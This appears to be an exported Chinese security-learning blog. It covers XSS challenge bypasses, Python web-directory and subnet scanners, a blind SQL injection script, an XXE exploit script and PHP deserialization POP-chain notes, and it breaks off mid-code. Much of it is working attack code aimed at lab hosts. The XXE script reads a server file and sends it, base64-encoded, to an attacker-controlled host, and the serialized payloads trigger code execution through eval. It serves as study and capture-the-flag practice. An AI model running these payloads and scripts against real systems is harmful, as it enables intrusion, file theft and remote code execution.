<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>过滤了圆括号（）  反引号 `<br> 用<svg>标签中可以直接执行实体字符</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203328.png)</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><p>这里使用!-->闭合</p>
<p><code>!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203548.png)</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>​        过滤以auto开头或者on开头，=等号结尾的标签属性并替换成下划线_ , 且忽略大小写，虽然看起来好像无解了。但是这里我们可以通过换行来绕过正则的检查，看源码写的type=“text”<br> 是文本格式无法执行，我们用type=“image”绕过 </p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204137.png)</p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>\w+:多个 英文字母或数字或下划线组成的<br> /?: 0个或1个/<br> g: 全局匹配<br> i: 不区分大小写</p>
<p>这里过滤了<多个字母或数字> 也就是说 <a>, </a> <111> 全部替换成空，可以用低优先级来解决去掉末尾的></p>
<pre><code>&lt;body onload=&quot;alert(1)&quot;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p>​      代码中将</style>标签替换成/ u574Fu4EBA /，且忽略大小写；正则的目的在于防止我们闭合<style>标签，但是这里我们依然可以通过换行绕过正则进行闭合。</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204809.png)</p>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p>
<p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120205401.png)</p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>xss漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>python编写简单C段&amp;web目录扫描工具</title>
    <url>/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</url>
    <content><![CDATA[<h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><pre><code>import requests
from optparse import OptionParser
import threading
from Queue import Queue
import sys

class WEB_DIR(threading.Thread):
    def __init__(self,queue):
            threading.Thread.__init__(self)
            self._queue = queue
    def run(self):
        while not self._queue.empty():
            url = self._queue.get()
            try:
                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}
                r = requests.get(url, headers=headers, timeout=1)
            except Exception,e:
              pass
            if r.status_code == 200:
                print &#39;[*]&#39; + url

def start(url,file,count):
    queue = Queue()
    f = open(&#39;%s.txt&#39; % file, &#39;r&#39;)
    for i in f:
        queue.put(url + i.strip(&#39;\r\n&#39;))
    threads = []
    thread_count = int(count)
    for i in range(thread_count):
        threads.append(WEB_DIR(queue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def main():
    parser = OptionParser()
    parser = OptionParser()
    parser.add_option(&quot;-u&quot;,&quot;--url&quot;,dest=&quot;url&quot;,help=&quot;Target url for scan&quot;)
    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;Dir filename&quot;)
    parser.add_option(&quot;-t&quot;, &quot;--thread&quot;, dest=&quot;count&quot;,type=int,default=10, help=&quot;scan thread count&quot;)
    options,args = parser.parse_args()
    if options.url and options.filename:
        start(options.url,options.filename,options.count)
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == &#39;__main__&#39;:
    main()</code></pre><h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><pre><code>import ipaddr
import requests
import threading
from Queue import Queue
import sys


class C_Scan(threading.Thread):
    def __init__(self,queue):
            threading.Thread.__init__(self)
            self._queue = queue
    def run(self):
        while not self._queue.empty():
            r = 0
            url = str(self._queue.get())
            url = &#39;http://&#39;+url
            try:
                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}
                r = requests.get(url, headers=headers, timeout=1)
            except Exception,e:
                pass
            if r.status_code == 200:
                    print &#39;[*]&#39; + url
def main():
    if len(sys.argv) != 2:
        print &#39;Usage: Python %s 192.168.1.1/24&#39;%(sys.argv[0])
    else:
        threads = []
        threadnum = 250
        queue = Queue()
        cidrip = sys.argv[1]
        ips = ipaddr.IPNetwork(cidrip)
        for ip in ips:
            queue.put(ip)
        for i in xrange(threadnum):
            threads.append(C_Scan(queue))
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print &quot;All Finished!!!&quot;

if __name__ == &#39;__main__&#39;:
    main()</code></pre>]]></content>
      <categories>
        <category>python学习</category>
      </categories>
  </entry>
  <entry>
    <title>python编写sql注入&amp;xml注入工具</title>
    <url>/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</url>
    <content><![CDATA[<h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><pre><code>import requests  #导入request模块

url = &#39;http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s&#39;
headers = {&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&#39;}  #定义请求header头
check_data=list(&#39;1234567890abcdefghijklmnopqrstuzwxyz@&#39;)  
print(&quot;SQL Injection for MySQL!&quot;)
l = &quot;&#39; and length(database())=%s and &#39;1&#39;=&#39;1&quot;            #定义注入语句
st = &quot;&#39; and substr(database(),%s,1)=&#39;%s&#39;and &#39;1&#39;=&#39;1&quot;     #定义注入语句
user = &quot;&quot;
for i in range(0,20):
    sql = l % str(i)        #payload拼接
    judge1 = requests.get(url % sql,headers=headers,timeout=30)
    if judge1.content.find(b&quot;You are in...........&quot;) != -1:   #判断页面回显
        length = i
        print(i)
        break

for k in range(1,i+1):
    for ss in check_data:
        str_user = st % (str(k),str(ss))
        judge2 = requests.get(url % str_user,headers=headers,timeout = 30)
        if judge2.content.find(b&quot;You are in...........&quot;) != -1:
            user = user + ss


print(user)</code></pre><h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><pre><code>from http.server import HTTPServer,CGIHTTPRequestHandler
import threading
import requests


def web_server():
    port = 3344
    httpd = HTTPServer((&#39;&#39;,port),CGIHTTPRequestHandler)
    print(&quot;[*] Starting simple_httpd on port:&quot;,httpd.server_port)
    httpd.serve_forever()

def send_data():
    files = &#39;C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php&#39;
    data = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&lt;!DOCTYPE test [\r\n&lt;!ENTITY % file SYSTEM \&quot;php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\&quot;&gt;\r\n&lt;!ENTITY % dtd SYSTEM \&quot;http://192.168.181.128/evil.xml\&quot; &gt;\r\n%dtd;\r\n%send;\r\n]&gt;&quot;
    requests.post(&quot;http://192.168.181.138/xxe-lab-master/php_xxe/&quot;,data=data)
    files = input(&quot;Write filename&quot;)

if __name__ == &#39;__main__&#39;:
    file = open(&#39;evil.xml&#39;,&#39;w&#39;)
    file.write(&quot;&lt;!ENTITY % payload \&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;HTTP://192.168.181.128/?content=%file;&#39;&gt;\&quot;&gt; %payload;&quot;)
    file.close()
    t1 = threading.Thread(target=web_server)
    t1.start()
    t2 = threading.Thread(target=send_data)
    t2.start()</code></pre>]]></content>
      <categories>
        <category>python学习</category>
      </categories>
  </entry>
  <entry>
    <title>php反序列化漏洞学习</title>
    <url>/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="反序列化漏洞学习笔记-靶场实战"><a href="#反序列化漏洞学习笔记-靶场实战" class="headerlink" title="反序列化漏洞学习笔记+靶场实战"></a>反序列化漏洞学习笔记+靶场实战</h2><h4 id="反序列化漏洞相关知识点："><a href="#反序列化漏洞相关知识点：" class="headerlink" title="反序列化漏洞相关知识点："></a>反序列化漏洞相关知识点：</h4><p><strong>（引自 i春秋网络安全学院文章）</strong></p>
<p>什么是反序列化：</p>
<p>摘自维基百科：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<p>序列化根据编程语言的不同分为：<strong>php反序列化，Java反序列化，python反序列化。</strong></p>
<p>在php应用中，序列化和反序列化一般用做缓存，比如<strong>seesion缓存,cookie</strong>等。</p>
<ul>
<li>序列化与反序列化与两个函数有关，分别是 <code>serialize()</code>、 <code>unserialize()</code> 这两个函数。</li>
<li>一般常用于传递 object ,object对象没法直接传值，所以需要先序列化为一段 字符串，接收方接收到后进行反序列化操作后即可得到原object对象。</li>
<li>当序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数 <em>\</em>sleep() ，这就允许对象在被序列化之前 做任何清除操作。类似的，当使用 unserialize() 恢复对象之前，将调用 __wakeup() 成员函数</li>
<li>反序列化函数<code>unserialize()</code>接收一个string类型的变量，该值为已序列化后的字符串。</li>
<li>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP会自动地试图去调用 <code>__wakeup()</code> 成员函数 （如果存在的话）。</li>
</ul>
<p><strong>常见的序列化格式：</strong></p>
<ul>
<li><p>二进制</p>
</li>
<li><p>字节数组</p>
</li>
<li><p>json字符串</p>
</li>
<li><p>xml字符串</p>
<p><strong>序列化的字符串参数理解：</strong></p>
<img src="1344396-20181107131554874-1824306350.png" style="zoom:50%;" />

<p><strong>PHP序列化与反序列化</strong></p>
<p>实现函数:<strong>string serialize()</strong>和 <strong>mixed  unserialize()</strong></p>
<p>我们这里创建了一个对象，并通过serialize序列化后进行了打印；</p>
<img src="QQ截图20200114102224.png" style="zoom:67%;" />

<h5 id="魔术函数（Magic-fucntion"><a href="#魔术函数（Magic-fucntion" class="headerlink" title="魔术函数（Magic fucntion)"></a>魔术函数（Magic fucntion)</h5><p>PHP类中有一种特殊函数体的存在叫<strong>魔法函数</strong>，magic函数命名是以符号__开头的。</p>
<p>导致php出现反序列化漏洞的<strong>主要原因</strong>就是我们所调用的<strong>魔术函数</strong>：</p>
<pre><code>__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><p>利用代码测试魔术环境：</p>
<img src="QQ截图20200114005210.png" style="zoom:50%;" />

</li>
</ul>
<p>运行发现php文件发现</p>
<img src="QQ截图20200114090134.png" style="zoom:67%;" />

<p><strong><strong>_wakeup()会在unserialize()自动调用，     _</strong>destruct会在对象销毁时自动调用</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d1181fb9a5ec18b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>PHP反序列化漏洞又称PHP对象注入，可能导致远程代码执行(RCE)，主要原因是程序的输入不当导致。</p>
<h5 id="漏洞产生的必要条件："><a href="#漏洞产生的必要条件：" class="headerlink" title="漏洞产生的必要条件："></a>漏洞产生的必要条件：</h5><p>1.unserialize函数的变量可控。（还可以结合Phar://协议）</p>
<p>2.php文件中存在可利用的类，类中有魔术方法。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p>我们在本地网站新建demo.php</p>
<img src="QQ截图20200113235252.png" style="zoom:50%;" />

<p>我们可以尝试构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200113235324.png" alt=""></p>
<p>在url中填入序列化好的攻击代码，即可利用成功</p>
<img src="QQ截图20200113235312.png" style="zoom:50%;" />

<h5 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h5><p>我们在本地搭建环境后，新建class.php</p>
<img src="QQ截图20200114102834.png" style="zoom: 67%;" />

<p>我们通过控制序列化字符串在本地新建一个shell.php进而打开phpinfo界面；在调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。</p>
<p>效果如下：</p>
<img src="QQ截图20200114103132.png" style="zoom:50%;" />

<img src="QQ截图20200114103150.png" style="zoom: 25%;" />





<h5 id="示例3：（多次调用魔术函数）"><a href="#示例3：（多次调用魔术函数）" class="headerlink" title="示例3：（多次调用魔术函数）"></a>示例3：（多次调用魔术函数）</h5><img src="QQ截图20200114103838.png" style="zoom:67%;" />

<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用<strong>wakeup()函数，从而在new joker()会自动调用对象joker中的</strong>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p>
<h4 id="PHP反序列化pop链构造"><a href="#PHP反序列化pop链构造" class="headerlink" title="PHP反序列化pop链构造"></a>PHP反序列化pop链构造</h4><h5 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h5><p>​    面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
<h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​    在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
<h5 id="POP-CHAIN"><a href="#POP-CHAIN" class="headerlink" title="POP CHAIN:"></a>POP CHAIN:</h5><p>​        把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
<p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Smi1e</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">safe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Here is safe"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">unsafe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>构造POP链。<br><code>protected $ClassObj = new evil();</code>是不行的，还是要通过<code>__construct</code>来实例化。<br>受保护成员变量含有<code>\0</code>和<code>*</code>需要URL编码一下。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name">Smi1e</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">unsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">unsafe</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Smi1e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>payload:<code>test=O%3A5%3A%22Smi1e%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A6%3A%22unsafe%22%3A1%3A%7Bs%3A12%3A%22%00unsafe%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8e65abd0d89d46e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="phpggc："><a href="#phpggc：" class="headerlink" title="phpggc："></a>phpggc：</h5><p>收集了一些常见的PHP框架的通用反序列化的小工具链</p>
<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p>
<p>使用方法参考此文章：</p>
<p><a href="https://xz.aliyun.com/t/5450" target="_blank" rel="noopener">从0到1掌握反序列化工具之PHPGGC</a></p>
<h5 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h5><p>首先，如果想要利用php的反序列化漏洞一般需要两个条件：</p>
<ol>
<li>unserialize()函数参数可控。(还可以结合Phar://协议)</li>
<li>魔法方法和危险函数。</li>
</ol>
<p>这两个条件都是不言而喻的，反序列化漏洞就是反序列化后魔法方法的执行，导致了魔法方法中的危险函数被执行。</p>
<p>可是我们常常会发现想要利用的危险函数并不在存在有魔法方法的类中，而此时就是要构造POP链，让没有关系的类扯上关系。</p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>lemon师傅的例子：</p>
<pre><code>?php
class lemon {
    protected $ClassObj;

    function __construct() {
        $this-&gt;ClassObj = new normal();
    }

    function __destruct() {
        $this-&gt;ClassObj-&gt;action();
    }
}

class normal {
    function action() {
        echo &quot;hello&quot;;
    }
}

class evil {
    private $data;
    function action() {
        eval($this-&gt;data);
    }
}

unserialize($_GET[&#39;d&#39;]);</code></pre><p>可以看到，我们先在evil类中找到了eval危险函数，在lemon类中找到了可以利用的魔法方法<strong>destruct()，怎么利用它俩呢？首先，虽然\</strong>destruct()执行的是normal类的action，但是我们可以看到evil类也有action函数，且eval函数也在evil类的action方法中。</p>
<p>我们都知道，<strong>construct()函数是在类刚创建时执行的，这意味着即使我们将normal类替换成evil类叶柄不会影响后面的代码，而我们希望在\</strong>destruct中执行的action就变成了evil中的action。</p>
<p>生成序列化数据：</p>
<pre><code>&lt;?php
class lemon {
    protected $ClassObj;
    function __construct() {
        $this-&gt;ClassObj = new evil();
    }
}
class evil {
    private $data = &quot;phpinfo();&quot;;
}
echo urlencode(serialize(new lemon()));</code></pre><p>我们再看一个例子(2019安恒杯1月赛)：</p>
<pre><code>&lt;?php  
@error_reporting(1); 
include &#39;flag.php&#39;;
class baby 
{   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    {      
        $this-&gt;skyobj = new sec;
    }  
    function __toString()      
    {          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    }  
}  

class cool 
{    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    {   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
        {
            $file = &quot;./{$this-&gt;filename}&quot;;        
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return &quot;you must be joking!&quot;; 
            }    
        }
    }  
}  

class sec 
{  
    function read()     
    {          
        return &quot;it&#39;s so sec~~&quot;;      
    }  
}  

if (isset($_GET[&#39;data&#39;]))  
{ 
    $Input_data = unserialize($_GET[&#39;data&#39;]);
    echo $Input_data; 
} 
else 
{ 
    highlight_file(&quot;./index.php&quot;); 
} 
?&gt; </code></pre><p>这道题其实和上面一题差不多，也是在baby类中的__toString()魔法方法中借用cool类的read()函数读取文件。</p>
<p>其中这道题还有以下的限制代码</p>
<pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);
$this-&gt;nice-&gt;aaa = $sth;
if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p><code>$sth</code>我们并不知道值，但如果我们事先将bbb的指针指向aaa，那么就一定可以成功了。</p>
<pre><code>$a = new baby();
$a-&gt;bbb = &amp;$a-&gt;aaa;
echo urlencode(serialize($a));</code></pre><h5 id="复杂一点的例子"><a href="#复杂一点的例子" class="headerlink" title="复杂一点的例子"></a>复杂一点的例子</h5><p>还是lemon师傅博客中的例子：</p>
<pre><code>&lt;?php

class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }
  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename));
    $this-&gt;format = $format;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger;
  protected $name;
  protected $group;
  protected $url;
  function __construct($name, $group, $url) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;url = $url;
    $fltr = new OutputFilter(&quot;/\[i\](.*)\[\/i\]/i&quot;, &quot;&lt;i&gt;\\1&lt;/i&gt;&quot;);
    $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\n&quot;)));
  }
  function __toString() {
    return &quot;&lt;a href=&#39;&quot; . $this-&gt;url . &quot;&#39;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
  function get_name() {
      return $this-&gt;name;
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
  function shortForm() {
    return &quot;&lt;p&gt;&lt;a href=&#39;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&#39;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;;
  }
  function name_is($name) {
    return $this-&gt;song-&gt;get_name() === $name;
  }
};

class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE[&#39;lyrics&#39;])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie(&#39;lyrics&#39;, base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE[&#39;lyrics&#39;])) {
      return unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));
    }
    else {
      setcookie(&#39;lyrics&#39;, base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};

class Porter {
  static function exportData($lyrics) {
    return base64_encode(serialize($lyrics));
  }
  static function importData($lyrics) {
    return serialize(base64_decode($lyrics));
  }
};

class Conn {
  protected $conn;
  function __construct($dbuser, $dbpass, $db) {
    $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db);
  }

  function getLyrics($lyrics) {
    $r = array();
    foreach ($lyrics as $lyric) {
      $s = intval($lyric);
      $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;);
      while (($row = $result-&gt;fetch_row()) != NULL) {
        $r []= unserialize(base64_decode($row[0]));
      }
    }
    return $r;
  }

  function addLyrics($lyrics) {
    $ids = array();
    foreach ($lyrics as $lyric) {
      $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\&quot;)&quot;);
      $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;);
      $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]);
    }
    echo var_dump($ids);
    return $ids; 
  }

  function __destruct() {
    $this-&gt;conn-&gt;close();
    $this-&gt;conn = NULL;
  }
